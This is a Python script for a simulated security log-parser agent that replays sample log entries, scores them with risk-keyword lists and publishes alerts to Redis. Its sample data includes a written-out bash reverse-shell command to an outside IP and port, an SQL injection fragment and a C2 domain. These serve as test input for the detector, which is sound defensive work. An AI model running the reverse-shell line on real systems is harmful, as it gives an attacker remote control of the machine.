#!/usr/bin/env python3
"""
Log Parser Agent for ATRO-Lite

This agent parses various log sources for security events.
In a production environment, this would integrate with actual log sources
such as ELK stack, Splunk, or direct log files.
"""

import json
import os
import random
import redis
import signal
import sys
import time
from datetime import datetime

# Configuration from environment
AGENT_ID = os.environ.get('AGENT_ID', '0')
AGENT_NAME = os.environ.get('AGENT_NAME', 'Log Parser')
REDIS_URL = os.environ.get('REDIS_URL', 'redis://localhost:6379')

# Sample log entries to simulate log parsing
SAMPLE_LOG_ENTRIES = [
    {
        "level": "ERROR",
        "message": "Failed login attempt for user 'root' from IP 202.94.32.6 - SSH",
        "source": "Auth Logs",
        "details": "User authentication failure"
    },
    {
        "level": "WARNING",
        "message": "Web server 192.168.1.10 received potential XSS payload in POST request",
        "source": "Web Server",
        "details": "Possible XSS attack attempt"
    },
    {
        "level": "CRITICAL",
        "message": "Malware signature detected in file: /tmp/.hidden/payload.elf",
        "source": "Antivirus",
        "details": "Malware detected"
    },
    {
        "level": "WARNING",
        "message": "DNS query to known C2 domain: evil-malware.example.com",
        "source": "DNS Server",
        "details": "Potential command and control activity"
    },
    {
        "level": "WARNING",
        "message": "Unusual process spawned: bash -i >& /dev/tcp/45.63.82.91/4444 0>&1",
        "source": "System Logs",
        "details": "Reverse shell attempt"
    },
    {
        "level": "INFO",
        "message": "User 'analyst1' accessed threat intelligence dashboard",
        "source": "Application Logs",
        "details": "User activity"
    },
    {
        "level": "INFO",
        "message": "File integrity check completed - 3 modified system files",
        "source": "File Integrity",
        "details": "System file changes"
    },
    {
        "level": "ERROR",
        "message": "Database query failed: Syntax error in SQL statement near 'WHERE 1=1;--'",
        "source": "Database",
        "details": "Potential SQL injection"
    }
]

# Connect to Redis for MCP
try:
    redis_client = redis.Redis.from_url(REDIS_URL)
    redis_client.ping()  # Test connection
    print(f"Connected to Redis MCP at {REDIS_URL}")
except Exception as e:
    print(f"Error connecting to Redis: {e}")
    redis_client = None

# Signal handlers for graceful shutdown
def handle_signal(signum, frame):
    print(f"Received signal {signum}, shutting down...")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

def normalize_log_level(level):
    """
    Map log level to standardized format
    """
    level = level.upper()
    if level in ["ERROR", "CRITICAL", "FATAL"]:
        return "critical"
    elif level in ["WARNING", "WARN"]:
        return "warning"
    elif level in ["INFO", "INFORMATION", "NOTICE"]:
        return "info"
    elif level in ["DEBUG", "TRACE"]:
        return "debug"
    else:
        return "info"

def log_event(level, message, metadata=None):
    """
    Log an event to stdout in JSON format for the Node.js process to capture
    """
    log_data = {
        "type": "log",
        "level": level,
        "message": message,
        "metadata": metadata or {}
    }
    print(json.dumps(log_data))

def assess_security_implication(log_entry):
    """
    Simple assessment of security implications
    In a real implementation, this would use more sophisticated analysis
    """
    message = log_entry["message"].lower()
    
    # Keywords indicating potential security issues
    high_risk_keywords = [
        "malware", "attack", "breach", "compromise", "exploit", "hack", 
        "backdoor", "trojan", "virus", "ransomware", "spyware", "rootkit",
        "command and control", "c2", "c&c", "reverse shell", "payload"
    ]
    
    medium_risk_keywords = [
        "failed login", "authentication failure", "brute force", "injection",
        "xss", "cross-site", "csrf", "unauthorized", "permission denied",
        "suspicious", "anomaly", "unusual", "irregular"
    ]
    
    # Check for high risk indicators
    for keyword in high_risk_keywords:
        if keyword in message:
            return "high"
    
    # Check for medium risk indicators
    for keyword in medium_risk_keywords:
        if keyword in message:
            return "medium"
    
    # Default to low
    return "low"

def create_alert(log_entry, risk_level):
    """
    Create an alert based on the log entry
    """
    if risk_level in ["medium", "high"]:
        severity = "medium" if risk_level == "medium" else "high"
        
        # Increase severity for critical logs
        if log_entry["level"] == "CRITICAL":
            severity = "critical"
        
        alert_data = {
            "type": "alert",
            "severity": severity,
            "title": f"Log Alert: {log_entry['source']}",
            "description": log_entry["message"],
            "metadata": log_entry
        }
        print(json.dumps(alert_data))
        
        # For high severity alerts, create an incident
        if severity == "high" or severity == "critical":
            incident_data = {
                "type": "incident",
                "incidentType": log_entry["details"],
                "metadata": {
                    "log": log_entry,
                    "risk_level": risk_level
                }
            }
            print(json.dumps(incident_data))
            
        # Share context with MCP
        if redis_client:
            try:
                context_data = {
                    "log": log_entry,
                    "risk_level": risk_level,
                    "severity": severity,
                    "timestamp": datetime.now().isoformat()
                }
                redis_client.set(f"mcp:context:log:{log_entry['source']}", json.dumps(context_data))
                redis_client.publish("mcp:logs:alerts", json.dumps(context_data))
            except Exception as e:
                print(f"Error sharing context with MCP: {e}")

def parse_logs():
    """
    Main function that simulates log parsing
    """
    log_event("info", f"Log parsing started - Agent {AGENT_NAME} (ID: {AGENT_ID})")
    
    try:
        while True:
            # In a real implementation, this would read from actual log sources
            # For simulation, we randomly select a log entry
            log_entry = random.choice(SAMPLE_LOG_ENTRIES)
            
            # Add current timestamp
            log_entry["timestamp"] = datetime.now().isoformat()
            
            # Normalize log level
            normalized_level = normalize_log_level(log_entry["level"])
            
            # Log the parsed entry
            log_event(
                normalized_level, 
                f"[{log_entry['source']}] {log_entry['message']}", 
                {"source": log_entry["source"], "details": log_entry["details"]}
            )
            
            # Assess security implications
            risk_level = assess_security_implication(log_entry)
            
            # Create alert if needed
            if risk_level != "low":
                create_alert(log_entry, risk_level)
            
            # Sleep between 20-40 seconds to simulate log checking interval
            wait_time = random.randint(20, 40)
            time.sleep(wait_time)
            
    except Exception as e:
        log_event("critical", f"Error in log parsing: {str(e)}")
        raise

if __name__ == "__main__":
    try:
        parse_logs()
    except KeyboardInterrupt:
        print("Log parsing stopped")
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)
